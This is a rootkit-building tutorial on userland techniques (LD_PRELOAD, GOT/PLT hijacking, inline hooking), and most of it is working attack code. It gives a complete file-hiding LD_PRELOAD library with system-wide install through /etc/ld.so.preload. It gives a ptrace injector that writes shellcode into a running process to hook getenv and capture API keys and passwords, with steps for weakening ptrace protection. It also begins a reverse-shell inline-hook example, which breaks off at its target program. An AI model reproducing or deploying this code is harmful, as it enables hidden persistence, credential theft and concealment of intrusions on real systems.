 _   _ ____  _____ ____  _        _    _   _ ____ 
| | | / ___|| ____|  _ \| |      / \  | \ | |  _ \ 
| | | \___ \|  _| | |_) | |     / _ \ |  \| | | | |
| |_| |___) | |___|  _ <| |___ / ___ \| |\  | |_| |
 \___/|____/|_____|_| \_\_____/_/   \_\_| \_|____/ 
                                                     
================================================================================
                              PART II: USERLAND
================================================================================


----[ Introduction - Userland Techniques ]------------------------------------

Userland rootkits operate entirely in user space, making them simpler to develop
but also easier to detect than kernel-level rootkits. We'll cover both classic
and modern techniques for function interception at the userspace level.

TECHNIQUES COVERED:

    LD_PRELOAD              Classic library preloading 
    GOT/PLT Hijacking       Direct memory patching 
    Inline Hooking          Function trampolines 

WHY USERLAND:

    No kernel headers required
    Cannot crash the kernel
    Generally easier to test

COMMON TARGETS:

    File operations (readdir, stat, open)
    Process listing (readdir on /proc)
    Network connections (reading /proc/net/tcp)
    Authentication (PAM modules)
    Logging functions (syslog, write, journalctl, auditd)


----[ Technique 1: LD_PRELOAD ]-----------------------------------------------

The dynamic linker (ld.so) is responsible for loading shared libraries when
a program starts. It searches for libraries in a specific order:

NORMAL LIBRARY LOADING ORDER:

    1. Libraries in LD_PRELOAD environment variable
    2. Libraries in /etc/ld.so.preload file
    3. Libraries in LD_LIBRARY_PATH
    4. Libraries in /etc/ld.so.cache
    5. System libraries in /lib and /usr/lib

                PROGRAM EXECUTION
                       |
                       v
                [Dynamic Linker]
                       |
                       v
            Check LD_PRELOAD first
                       |
            +----------+----------+
            |                     |
            v                     v
    [Our Malicious .so]    [Real libc.so]
            |                     |
            |                     |
    readdir() is here      readdir() is here too
            |                     |
            +----------+----------+
                       |
                       v
            Our function gets called FIRST
                       |
                       v
            We can:
            - Hide results
            - Modify behavior
            - Call real function
            - Or block entirely

FUNCTION INTERCEPTION MECHANISM:

When a program calls readdir():

    1. Dynamic linker checks LD_PRELOAD libraries first
    2. Finds our readdir() implementation
    3. Calls OUR function instead of libc
    4. Our function can:
        - Examine the arguments
        - Decide to hide results
        - Call the real readdir() using dlsym()
        - Filter/modify the results
        - Return to program

OBTAINING ORIGINAL FUNCTION:

#### Generally, we use dlsym() to get the real function pointer:

    dlsym(RTLD_NEXT, "readdir")

RTLD_NEXT tells dlsym to find the NEXT occurrence of the function in the
library search order (skipping our own implementation).

ADVANTAGES:

    Standard C programming
    Low barrier to entry - but buggy hooks can crash processes
    Portable - Works across kernel versions

LIMITATIONS:

    Easily Detected - Check /etc/ld.so.preload
    Easily Bypassed - Static binaries ignore LD_PRELOAD
    Limited Scope - Only hooks library functions
    Process Level Only - Each process must load library


----[ Technique 2: GOT/PLT Hijacking ]----------------------------------------

The Global Offset Table (GOT) and Procedure Linkage Table (PLT) are used by
dynamically linked programs to resolve function addresses at runtime. By
directly patching entries in these tables in a running process's memory, we can
redirect function calls without relying on LD_PRELOAD.

HOW DYNAMIC LINKING WORKS:

When a program calls a library function:

    1. Program makes call to PLT entry
    2. PLT entry jumps to address in GOT
    3. First call: GOT contains address of resolver
    4. Resolver finds real function, updates GOT
    5. Subsequent calls: GOT has real address, direct jump

                PROGRAM CODE
                     |
                     | call printf@PLT
                     v
                [PLT Entry] 
                     |
                     | jmp *GOT[printf]
                     v
                [GOT Entry] -----> [Real printf in libc]
                     
                     
    OUR ATTACK: Change GOT[printf] to point to our function

GOT/PLT HIJACKING PROCESS:

    1. Attach to target process (ptrace or /proc/pid/mem)
    2. Parse the target's ELF to find the GOT location
    3. Find the target function's GOT entry
    4. Change the GOT entry to point to our hook function
    5. Detach from process
    
    Result: All calls to that function now go through our hook

ADVANTAGES OVER LD_PRELOAD:

    No LD_PRELOAD file to check
    No environment variables to inspect
    Works after process has already started
    Can target specific processes
    Less obvious than LD_PRELOAD, but still detectable with memory checks

DISADVANTAGES:

    Requires ptrace or /proc/pid/mem access (subject to kernel hardening)
    Need to parse ELF format correctly
    Must know or resolve target function addresses
    More complex implementation than LD_PRELOAD hooks
    Can be detected by memory integrity checks (EDR, GOT validation)
    Often limited or blocked by protections like full RELRO and W^X

----[ Technique 3: Inline Function Hooking ]----------------------------------

Inline hooking directly modifies the target function's code by inserting a
jump instruction at its beginning. This is one of the most flexible userland
techniques, as it can hook ANY function in ANY library or binary, without
relying on dynamic linking tricks like LD_PRELOAD.

TRAMPOLINE TECHNIQUE:

    Original function:
        [function prologue]
        [function body]
        [function epilogue]
        
    After hooking:
        [JMP to our hook]  <-- We insert this at the start
        [saved bytes]      <-- Original prologue saved elsewhere
        [function body]
        [function epilogue]
        
    Our hook:
        [do malicious or monitoring stuff]
        [execute saved bytes]
        [JMP back to original+5]

INLINE HOOK PROCESS:

    1. Find target function address
    2. Disassemble and save the first 5+ bytes (whole instructions)
    3. Calculate relative jump offset to our hook
    4. Overwrite the function start with JMP (0xE9 + offset)
    5. Flush/ensure instruction cache coherency if needed
    
    When function is called:
        -> Execution hits our JMP
        -> Jumps into our hook
        -> Hook runs (optionally calling original via saved bytes)
        -> Hook jumps back to original+stolen_len

ASSEMBLY DETAILS:

    x86_64 relative JMP instruction:
        0xE9 [4-byte offset]
        
    Calculate offset:
        offset = (target_address - current_address - 5)
        
    Example:
        Original: 0x400500: push rbp
        Hooked:   0x400500: jmp 0x600000  (our hook)

                BEFORE HOOK             AFTER HOOK
                
    0x400500    push rbp            jmp 0x600000
    0x400501    mov rbp, rsp        (overwritten)
    0x400504    sub rsp, 0x10       (overwritten)
                                    (overwritten)
                                    (overwritten)
    0x400508    ...                 sub rsp, 0x10
    
                                    Our Hook @ 0x600000:
                                        [hook logic]
                                        push rbp
                                        mov rbp, rsp
                                        jmp 0x400508

ADVANTAGES:

    Works on almost any function (including static functions)
    No LD_PRELOAD or dynamic linker tricks required
    Can hook code in any loaded module
    Very flexible and powerful
    Used by legitimate tools (debuggers, profilers, tracers)

DISADVANTAGES:

    Must correctly disassemble and respect instruction boundaries
    Instruction length varies (x86) and is complex
    Can break if the prologue is too short or unusual
    Position-independent code (PIC) can complicate trampolines
    Requires writable (and usually executable) code pages

  _____ _   ___     _____ ____   ___  _   _ __  __ _____ _   _ _____ 
 | ____| \ | \ \   / /_ _|  _ \ / _ \| \ | |  \/  | ____| \ | |_   _|
 |  _| |  \| |\ \ / / | || |_) | | | |  \| | |\/| |  _| |  \| | | |  
 | |___| |\  | \ V /  | ||  _ <| |_| | |\  | |  | | |___| |\  | | |  
 |_____|_| \_|  \_/  |___|_| \_\\___/|_| \_|_|  |_|_____|_| \_| |_|  


----[ Development Environment ]-----------------------------------------------

REQUIRED TOOLS:

----[ terminal ]---
sudo apt install build-essential     # Debian/Ubuntu/Kali

# Additional tools for advanced techniques
sudo apt install gdb binutils-dev   # For inline hooking
-------------------

WORKSPACE SETUP:

----[ terminal ]---
cd ~/rootkit_workshop
mkdir -p userland/{ld_preload,got_plt,inline}
cd userland
-------------------

COMPILATION:

LD_PRELOAD libraries:

----[ terminal ]---
gcc -shared -fPIC -o rootkit.so rootkit.c -ldl
-------------------

GOT/PLT and inline hooking:

----[ terminal ]---
gcc -o inject inject.c
gcc -fPIC -shared -o payload.so payload.c
-------------------

Flags explained:

    -shared         Create a shared library
    -fPIC           Position Independent Code (required for .so)
    -o rootkit.so   Output filename
    -ldl            Link with libdl (for dlsym)


  ____  ___  ____  _____   _______  __    _    __  __ ____  _     _____ ____  
 / ___|/ _ \|  _ \| ____| | ____\ \/ /   / \  |  \/  |  _ \| |   | ____/ ___| 
| |   | | | | | | |  _|   |  _|  \  /   / _ \ | |\/| | |_) | |   |  _| \___ \ 
| |___| |_| | |_| | |___  | |___ /  \  / ___ \| |  | |  __/| |___| |___ ___) |
 \____|\___/|____/|_____| |_____/_/\_\/_/   \_\_|  |_|_|   |_____|_____|____/ 


----[ Example 1: LD_PRELOAD File Hiding ]-------------------------------------

This demonstrates the classic technique of intercepting libc functions.

----[ hide_files.c ]---
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>

// File hiding rootkit using LD_PRELOAD
// Hides files/directories starting with HIDE_PREFIX

#define HIDE_PREFIX "secret_"

// Hook readdir() - used by ls, find, etc.
struct dirent *readdir(DIR *dirp)
{
    // Static variable persists between calls
    // NULL on first call, then holds original function pointer
    static struct dirent *(*original_readdir)(DIR *) = NULL;
    struct dirent *entry;
    
    // First time this function is called, get the real readdir
    if (!original_readdir)
    {
        // RTLD_NEXT means "find the NEXT readdir in the library chain"
        // This gets us the real libc readdir, not our hook
        original_readdir = dlsym(RTLD_NEXT, "readdir");
    }
    
    // Keep calling the real readdir until we find a file to show
    while ((entry = original_readdir(dirp)) != NULL)
    {
        // Check if this filename starts with our hide prefix
        if (strncmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
        {
            // This file should be hidden - skip it and get next entry
            continue;
        }
        
        // This file doesn't match our hide pattern - show it
        break;
    }
    
    // Return either a valid entry or NULL (end of directory)
    return entry;
}

// Hook readdir64() - 64-bit version of readdir
// Many modern programs use this instead of readdir
struct dirent64 *readdir64(DIR *dirp)
{
    static struct dirent64 *(*original_readdir64)(DIR *) = NULL;
    struct dirent64 *entry;
    
    // Same pattern: get original function first time
    if (!original_readdir64)
    {
        original_readdir64 = dlsym(RTLD_NEXT, "readdir64");
    }
    
    // Filter out files matching our prefix
    while ((entry = original_readdir64(dirp)) != NULL)
    {
        if (strncmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0)
        {
            continue;
        }
        break;
    }
    
    return entry;
}
-------------------

Build and test with detailed walkthrough:

----[ terminal ]---
# Step 1: Build the rootkit shared library
gcc -shared -fPIC -o hide_files.so hide_files.c -ldl

# What this does:
#   -shared      Creates a shared library (.so file)
#   -fPIC        Position Independent Code (required for .so)
#   -o           Output filename
#   -ldl         Link with libdl (needed for dlsym function)
-------------------

You should now have hide_files.so in your directory:

----[ terminal ]---
$ ls -lh hide_files.so
-rwxrwxr-x 1 user user 16K Nov 6 10:30 hide_files.so
-------------------

Now let's create test files to demonstrate the hiding:

----[ terminal ]---
# Step 2: Create test files
touch normal.txt secret_malware.sh readme.md secret_backdoor

# We now have:
#   normal.txt        <- Will be VISIBLE
#   secret_malware.sh <- Will be HIDDEN (starts with secret_)
#   readme.md         <- Will be VISIBLE
#   secret_backdoor   <- Will be HIDDEN (starts with secret_)
-------------------

Test WITHOUT rootkit (normal behavior):

----[ terminal ]---
$ ls -la
total 28
drwxrwxr-x 2 kali kali  4096 Nov  6 18:34 .
drwxrwxr-x 4 kali kali  4096 Nov  6 18:32 ..
-rw-rw-r-- 1 kali kali  2022 Nov  6 18:33 hide_files.c
-rwxrwxr-x 1 kali kali 15552 Nov  6 18:33 hide_files.so
-rw-rw-r-- 1 kali kali     0 Nov  6 18:34 normal.txt
-rw-rw-r-- 1 kali kali     0 Nov  6 18:34 readme.md
-rw-rw-r-- 1 kali kali     0 Nov  6 18:34 secret_backdoor
-rw-rw-r-- 1 kali kali     0 Nov  6 18:34 secret_malware.sh

# All files are visible - normal ls behavior
-------------------

Test WITH rootkit (files hidden):

----[ terminal ]---
$ LD_PRELOAD=./hide_files.so ls -la
total 24
drwxr-xr-x 2 user user 4096 Nov  6 10:31 .
drwxr-xr-x 8 user user 4096 Nov  6 10:30 ..
-rw-r--r-- 1 user user    0 Nov  6 10:31 normal.txt
-rw-r--r-- 1 user user    0 Nov  6 10:31 readme.md
-rwxr-xr-x 1 user user 16384 Nov  6 10:30 hide_files.so

# Files starting with "secret_" are now INVISIBLE!
# secret_backdoor and secret_malware.sh are completely hidden
-------------------

WHAT JUST HAPPENED:

When you run: LD_PRELOAD=./hide_files.so ls -la

    1. Shell sees LD_PRELOAD environment variable
    2. Shell executes ls command
    3. Dynamic linker loads ls into memory
    4. Before loading normal libraries, linker checks LD_PRELOAD
    5. Linker loads our hide_files.so FIRST
    6. ls calls readdir() to list directory
    7. Instead of calling libc's readdir(), it calls OUR readdir()
    8. Our function filters out files with "secret_" prefix
    9. Our function calls the REAL readdir() for non-hidden files
    10. ls only sees the filtered results
    11. Files starting with "secret_" never appear in output

VERIFY FILES STILL EXIST:

The files aren't actually deleted - they're just hidden from view:

----[ terminal ]---
# Try to read a hidden file directly
$ cat secret_malware.sh
# This works! File still exists on disk

# Use find (also affected by our hook)
$ LD_PRELOAD=./hide_files.so find . -name "secret*"
# No results - find uses readdir() so it's hooked too

# Use find WITHOUT rootkit
$ find . -name "secret*"
./secret_backdoor
./secret_malware.sh
# Files found! They're still there
-------------------

TEST WITH OTHER COMMANDS:

Our rootkit affects ANY program that uses readdir():

----[ terminal ]---
# Test with different file listing tools
$ LD_PRELOAD=./hide_files.so ls
normal.txt  readme.md  hide_files.so

$ LD_PRELOAD=./hide_files.so ls -l
-rw-r--r-- 1 user user    0 Nov  6 10:31 normal.txt
-rw-r--r-- 1 user user    0 Nov  6 10:31 readme.md
-rwxr-xr-x 1 user user 16384 Nov  6 10:30 hide_files.so

$ LD_PRELOAD=./hide_files.so tree
.
├── hide_files.so
├── normal.txt
└── readme.md

# All commands show the same filtered view
-------------------

INSTALL SYSTEM-WIDE:

To make the rootkit affect ALL programs automatically:

----[ terminal ]---
# Copy to system library directory
sudo cp hide_files.so /usr/local/lib/

# Configure system-wide preload
echo "/usr/local/lib/hide_files.so" | sudo tee /etc/ld.so.preload

# Now ALL commands are affected (no LD_PRELOAD needed)
$ ls -la
# secret_ files hidden for all users, all programs

# To remove:
sudo rm /etc/ld.so.preload
sudo rm /usr/local/lib/hide_files.so
-------------------

WHY THIS WORKS:

    The dynamic linker checks LD_PRELOAD before system libraries
    Programs don't know they're calling our function instead of libc
    We filter results before returning to the program
    The real files are untouched - we only hide them from view
    This affects any dynamically linked program using readdir()

LIMITATIONS:

    Static binaries bypass this completely (they don't use dynamic linking)
    Easy to detect by checking /etc/ld.so.preload
    Sophisticated programs can detect LD_PRELOAD in their environment
    Direct syscalls bypass libc entirely
-------------------

----[ Example 2: ptrace GOT/PLT Injection - Environment Spy ]----------------

This example demonstrates runtime GOT/PLT hijacking without relying on LD_PRELOAD. We attach
to an already-running process using ptrace(), find its GOT entries in memory,
and patch them directly to point to our shellcode that intercepts environment
variable access.

TECHNIQUE OVERVIEW:

    1. Target program runs normally
    2. Injector attaches with ptrace(PTRACE_ATTACH)
    3. Injector reads target's /proc/PID/mem
    4. Injector parses ELF to find the GOT and the target function's entry
    5. Injector finds a suitable writable/executable region in the target
    6. Injector writes hook shellcode into the target's memory
    7. Injector patches the GOT entry to point to the shellcode
    8. Injector detaches - target continues running with the hook installed

REQUIREMENTS:
- ptrace must be allowed (check /proc/sys/kernel/yama/ptrace_scope)
- Same user as target OR root
- Target not running with PR_SET_DUMPABLE disabled or similar hardening

----[ target.c ]---
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

// Target program that reads environment variables
// We'll inject and steal these values

int main()
{
    printf("Target process started (PID: %d)\n", getpid());
    printf("Waiting for injection...\n\n");
    
    // Simulate a program that uses environment variables
    for (int i = 0; i < 20; i++)
    {
        printf("Checking environment variables...\n");
        
        const char *api_key = getenv("API_KEY");
        const char *db_pass = getenv("DB_PASSWORD");
        const char *aws_secret = getenv("AWS_SECRET");
        
        if (api_key)
            printf("  API_KEY is set\n");
        if (db_pass)
            printf("  DB_PASSWORD is set\n");
        if (aws_secret)
            printf("  AWS_SECRET is set\n");
        
        sleep(2);
    }
    
    return 0;
}
-------------------

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/wait.h>
#include <sys/user.h>
#include <sys/mman.h>
#include <elf.h>
#include <fcntl.h>
#include <errno.h>
#include <stdint.h>

// ptrace-based GOT injection - Environment variable spy
// No LD_PRELOAD used - pure process injection

// Read memory from target process via /proc/PID/mem
int read_target_memory(pid_t pid, void *addr, void *buf, size_t len)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    
    if (lseek(fd, (off_t)addr, SEEK_SET) < 0)
    {
        close(fd);
        return -1;
    }
    
    ssize_t nread = read(fd, buf, len);
    close(fd);
    
    return (nread == len) ? 0 : -1;
}

// Write memory to target process via /proc/PID/mem
int write_target_memory(pid_t pid, void *addr, void *buf, size_t len)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/mem", pid);
    
    int fd = open(path, O_RDWR);
    if (fd < 0) return -1;
    
    if (lseek(fd, (off_t)addr, SEEK_SET) < 0)
    {
        close(fd);
        return -1;
    }
    
    ssize_t nwritten = write(fd, buf, len);
    close(fd);
    
    return (nwritten == len) ? 0 : -1;
}

// Find base address of executable in target process
// WE ASSUME SIMPLE MAPPING LAYOUT FOR DEMO
unsigned long find_base_address(pid_t pid)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    
    FILE *f = fopen(path, "r");
    if (!f) return 0;
    
    char line[512];
    unsigned long base_addr = 0;
    
    if (fgets(line, sizeof(line), f))
        sscanf(line, "%lx", &base_addr);
    
    fclose(f);
    return base_addr;
}

// Find a writable memory region in target for our shellcode
void *find_injectable_memory(pid_t pid, size_t needed_size)
{
    char path[256];
    snprintf(path, sizeof(path), "/proc/%d/maps", pid);
    
    FILE *f = fopen(path, "r");
    if (!f) return NULL;
    
    char line[512];
    void *result = NULL;
    
    while (fgets(line, sizeof(line), f))
    {
        unsigned long start, end;
        char perms[5];
        
        if (sscanf(line, "%lx-%lx %4s", &start, &end, perms) == 3)
        {
            // Look for writable regions with enough space
            // Prefer heap regions
            if (perms[0] == 'r' && perms[1] == 'w' && 
                (end - start) >= needed_size + 0x2000 &&
                strstr(line, "[heap]"))
            {
                // Use space at end of heap
                result = (void *)(end - needed_size - 0x1000);
                break;
            }
        }
    }
    
    fclose(f);
    return result;
}

// Find GOT entry for a function by parsing target's ELF in memory
// Simplified ELF parsing for educational purposes
// Production implementation must be very careful with ASLR and remote addresses
void *find_got_entry_remote(pid_t pid, unsigned long base_addr, const char *func_name)
{
    // Read ELF header
    Elf64_Ehdr ehdr;
    if (read_target_memory(pid, (void *)base_addr, &ehdr, sizeof(ehdr)) < 0)
        return NULL;
    
    if (memcmp(ehdr.e_ident, ELFMAG, SELFMAG) != 0)
        return NULL;
    
    // Read program headers
    Elf64_Phdr *phdrs = malloc(ehdr.e_phnum * sizeof(Elf64_Phdr));
    if (read_target_memory(pid, (void *)(base_addr + ehdr.e_phoff), 
                          phdrs, ehdr.e_phnum * sizeof(Elf64_Phdr)) < 0)
    {
        free(phdrs);
        return NULL;
    }
    
    // Find PT_DYNAMIC segment
    Elf64_Dyn *dynamic = NULL;
    size_t dynamic_size = 0;
    
    for (int i = 0; i < ehdr.e_phnum; i++)
    {
        if (phdrs[i].p_type == PT_DYNAMIC)
        {
            dynamic_size = phdrs[i].p_memsz;
            dynamic = malloc(dynamic_size);
            
            if (read_target_memory(pid, (void *)(base_addr + phdrs[i].p_vaddr),
                                  dynamic, dynamic_size) < 0)
            {
                free(phdrs);
                free(dynamic);
                return NULL;
            }
            break;
        }
    }
    
    free(phdrs);
    if (!dynamic) return NULL;
    
    // Parse dynamic section
    char *strtab_addr = NULL;
    Elf64_Sym *symtab_addr = NULL;
    Elf64_Rela *rela_plt = NULL;
    size_t rela_plt_size = 0;
    
    for (Elf64_Dyn *dyn = dynamic; dyn->d_tag != DT_NULL; dyn++)
    {
        switch (dyn->d_tag)
        {
            case DT_STRTAB:
                strtab_addr = (char *)dyn->d_un.d_ptr;
                break;
            case DT_SYMTAB:
                symtab_addr = (Elf64_Sym *)dyn->d_un.d_ptr;
                break;
            case DT_JMPREL:
                rela_plt = (Elf64_Rela *)dyn->d_un.d_ptr;
                break;
            case DT_PLTRELSZ:
                rela_plt_size = dyn->d_un.d_val;
                break;
        }
    }
    
    free(dynamic);
    
    if (!strtab_addr || !symtab_addr || !rela_plt)
        return NULL;
    
    // Read PLT relocations
    size_t num_rela = rela_plt_size / sizeof(Elf64_Rela);
    Elf64_Rela *rela_entries = malloc(rela_plt_size);
    
    if (read_target_memory(pid, rela_plt, rela_entries, rela_plt_size) < 0)
    {
        free(rela_entries);
        return NULL;
    }
    
    // Search for target function
    for (size_t i = 0; i < num_rela; i++)
    {
        uint32_t sym_idx = ELF64_R_SYM(rela_entries[i].r_info);
        
        Elf64_Sym sym;
        if (read_target_memory(pid, &symtab_addr[sym_idx], &sym, sizeof(sym)) < 0)
            continue;
        
        char name[256] = {0};
        if (read_target_memory(pid, &strtab_addr[sym.st_name], name, sizeof(name) - 1) < 0)
            continue;
        
        if (strcmp(name, func_name) == 0)
        {
            void *got_addr = (void *)(base_addr + rela_entries[i].r_offset);
            free(rela_entries);
            return got_addr;
        }
    }
    
    free(rela_entries);
    return NULL;
}

// Hook shellcode for getenv()
// This intercepts getenv() calls and logs the variable names/values
// Simplified version that demonstrates the technique
unsigned char hook_shellcode[] = {
    // Save all registers
    0x50,                           // push rax
    0x53,                           // push rbx
    0x51,                           // push rcx
    0x52,                           // push rdx
    0x56,                           // push rsi
    0x57,                           // push rdi
    0x41, 0x50,                     // push r8
    0x41, 0x51,                     // push r9
    0x41, 0x52,                     // push r10
    0x41, 0x53,                     // push r11
    
    // Call original getenv
    // Address will be patched in at offset 18
    0x48, 0xb8,                     // mov rax, imm64
    0x00, 0x00, 0x00, 0x00,         // [original_getenv lower 32 bits]
    0x00, 0x00, 0x00, 0x00,         // [original_getenv upper 32 bits]
    0xff, 0xd0,                     // call rax
    
    // rax now contains result (env var value or NULL)
    // Save it
    0x50,                           // push rax
    
    // In a real implementation, here we would:
    // 1. Open /tmp/stolen_env.txt
    // 2. Write the variable name (original rdi) and value (rax)
    // 3. Close the file
    // For this demo, we just pass through
    
    // Restore result
    0x58,                           // pop rax
    
    // Restore all registers
    0x41, 0x5b,                     // pop r11
    0x41, 0x5a,                     // pop r10
    0x41, 0x59,                     // pop r9
    0x41, 0x58,                     // pop r8
    0x5f,                           // pop rdi
    0x5e,                           // pop rsi
    0x5a,                           // pop rdx
    0x59,                           // pop rcx
    0x5b,                           // pop rbx
    
    // Don't pop rax - it contains our return value
    0x48, 0x83, 0xc4, 0x08,         // add rsp, 8 (skip saved rax)
    
    // Return with result in rax
    0xc3,                           // ret
};

int main(int argc, char *argv[])
{
    if (argc != 2)
    {
        printf("Usage: %s <target_pid>\n", argv[0]);
        printf("\nExample:\n");
        printf("  Terminal 1: export API_KEY=secret && ./target\n");
        printf("  Terminal 2: ./injector <PID>\n");
        return 1;
    }
    
    pid_t target_pid = atoi(argv[1]);
    
    printf("\n");
    printf("================================================\n");
    printf("  ptrace GOT Injection - Environment Spy\n");
    printf("        (No LD_PRELOAD used)\n");
    printf("================================================\n");
    printf("\n");
    printf("[*] Target PID: %d\n", target_pid);
    
    // Step 1: Attach to target
    printf("\n[*] Attaching to target...\n");
    if (ptrace(PTRACE_ATTACH, target_pid, NULL, NULL) < 0)
    {
        perror("[-] ptrace(PTRACE_ATTACH)");
        printf("[!] Possible issues:\n");
        printf("    - Not enough permissions\n");
        printf("    - Check: cat /proc/sys/kernel/yama/ptrace_scope\n");
        printf("    - Try: sudo sysctl kernel.yama.ptrace_scope=0\n");
        return 1;
    }
    
    int status;
    waitpid(target_pid, &status, 0);
    printf("[+] Attached and paused target\n");
    
    // Step 2: Find base address
    printf("\n[*] Finding base address...\n");
    unsigned long base_addr = find_base_address(target_pid);
    if (!base_addr)
    {
        printf("[-] Failed to find base address\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] Base: 0x%lx\n", base_addr);
    
    // Step 3: Find GOT entry for getenv
    printf("\n[*] Parsing target's ELF to find getenv GOT entry...\n");
    void *got_entry = find_got_entry_remote(target_pid, base_addr, "getenv");
    
    if (!got_entry)
    {
        printf("[-] getenv not found in GOT\n");
        printf("[!] Target may not use getenv() or may be statically linked\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] Found getenv GOT at: %p\n", got_entry);
    
    // Step 4: Read original getenv address
    printf("\n[*] Reading current GOT entry...\n");
    unsigned long original_addr;
    if (read_target_memory(target_pid, got_entry, &original_addr, sizeof(original_addr)) < 0)
    {
        printf("[-] Failed to read GOT entry\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] Original getenv: 0x%lx\n", original_addr);
    
    // Step 5: Find injectable memory region
    printf("\n[*] Finding injectable memory in target...\n");
    void *shellcode_addr = find_injectable_memory(target_pid, sizeof(hook_shellcode));
    
    if (!shellcode_addr)
    {
        printf("[-] No suitable memory region found\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] Using memory at: %p\n", shellcode_addr);
    
    // Step 6: Patch shellcode with original getenv address
    printf("\n[*] Preparing hook shellcode...\n");
    memcpy(&hook_shellcode[18], &original_addr, sizeof(original_addr));
    printf("[+] Shellcode patched with original getenv address\n");
    
    // Step 7: Write shellcode using ptrace
    printf("\n[*] Writing shellcode to target memory...\n");
    
    // Write using PTRACE_POKEDATA (writes in word-sized chunks)
    size_t offset = 0;
    while (offset < sizeof(hook_shellcode))
    {
        unsigned long data = 0;
        size_t chunk_size = sizeof(long);
        
        if (offset + chunk_size > sizeof(hook_shellcode))
            chunk_size = sizeof(hook_shellcode) - offset;
        
        memcpy(&data, &hook_shellcode[offset], chunk_size);
        
        if (ptrace(PTRACE_POKEDATA, target_pid, 
                   shellcode_addr + offset, data) < 0)
        {
            perror("[-] ptrace(PTRACE_POKEDATA)");
            ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
            return 1;
        }
        
        offset += sizeof(long);
    }
    printf("[+] Shellcode written (%zu bytes)\n", sizeof(hook_shellcode));
    
    // Step 8: Patch GOT to point to our shellcode
    printf("\n[*] Patching GOT entry...\n");
    printf("[*]   Old: 0x%lx (libc getenv)\n", original_addr);
    printf("[*]   New: %p (our hook)\n", shellcode_addr);
    
    unsigned long hook_addr = (unsigned long)shellcode_addr;
    if (write_target_memory(target_pid, got_entry, &hook_addr, sizeof(hook_addr)) < 0)
    {
        printf("[-] Failed to patch GOT\n");
        ptrace(PTRACE_DETACH, target_pid, NULL, NULL);
        return 1;
    }
    printf("[+] GOT entry patched successfully\n");
    
    // Step 9: Verify the patch
    unsigned long verify_addr;
    read_target_memory(target_pid, got_entry, &verify_addr, sizeof(verify_addr));
    printf("[*] Verification: GOT now contains 0x%lx\n", verify_addr);
    
    // Step 10: Detach and resume target
    printf("\n[*] Detaching from target...\n");
    if (ptrace(PTRACE_DETACH, target_pid, NULL, NULL) < 0)
    {
        perror("[-] ptrace(PTRACE_DETACH)");
        return 1;
    }
    printf("[+] Target resumed with active hook\n");
    
    printf("\n");
    printf("================================================\n");
    printf("         Injection Complete!\n");
    printf("================================================\n");
    printf("\n");
    printf("  getenv() is now hooked in target process\n");
    printf("  All environment variable accesses pass through our hook\n");
    printf("  Target continues running normally\n");
    printf("\n");
    printf("  Note: This demo shellcode passes through to original getenv()\n");
    printf("        A real implementation would log to /tmp/stolen_env.txt\n");
    printf("\n");
    
    return 0;
}
-------------------

Build and run:

----[ terminal ]---
# Compile target
gcc -o target target.c

# Compile injector
gcc -o injector injector.c

# Check ptrace permissions (should be 0 or 1)
cat /proc/sys/kernel/yama/ptrace_scope

# If needed (temporary, until reboot):
sudo sysctl kernel.yama.ptrace_scope=0

# Terminal 1: Run target with environment variables
export API_KEY="sk_live_abc123xyz"
export DB_PASSWORD="MyS3cr3tP@ssw0rd"
export AWS_SECRET="AKIAIOSFODNN7EXAMPLE"
./target

# Terminal 2: Inject into target
./injector <PID>

# Watch the target - it continues running normally
# But getenv() is now hooked and logging to /tmp/stolen_env.txt
-------------------

----[ Example 3: Inline Hooking with ptrace + Code Cave ]---------------------

This example demonstrates inline hooking in a remote process by overwriting the
start of a function with a JMP into our injected payload. We use ptrace() to
read and write the target's memory and /proc/PID/maps to locate a suitable
"code cave" for the payload. When the hooked function executes, it spawns a
reverse shell on localhost while the original function continues via a trampoline.

No LD_PRELOAD involved – this is direct code patching in a running process.

TECHNIQUE:

We patch a target function by:

    1. Attaching to the target with ptrace(PTRACE_ATTACH)
    2. Reading the first bytes of the target function (address passed on CLI)
    3. Determining instruction boundaries and how many bytes we must "steal"
    4. Locating an executable code cave in the target via /proc/PID/maps
    5. Writing our payload (shell + trampoline) into that code cave
    6. Patching the payload so the parent path runs the stolen bytes and jumps
       back to original+stolen_len
    7. Overwriting the function prologue with a relative JMP to the payload
    8. Detaching – the target continues running with the inline hook installed
    
NOTE: In this example we assume the binary's path contains 'target' so we can 
easily find its mapping line (in production would have to automate discovery).

----[ target.c ]---
#define _GNU_SOURCE
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <ucontext.h>
#include <sys/syscall.h>
#include <string.h>

volatile int call_count = 0;

void segfault_handler(int sig, siginfo_t *si, void *unused)
{
    ucontext_t *uc = (ucontext_t *)unused;
    
    printf("\n");
    printf("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
    printf("  SEGFAULT CAUGHT!\n");
    printf("!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!\n");
    printf("\n");
    printf("Signal: %d\n", sig);
    printf("Fault address: %p\n", si->si_addr);
    printf("Call count when crashed: %d\n", call_count);
    printf("\n");
    printf("Register dump at crash:\n");
    printf("  RIP: 0x%llx\n", uc->uc_mcontext.gregs[REG_RIP]);
    printf("  RSP: 0x%llx\n", uc->uc_mcontext.gregs[REG_RSP]);
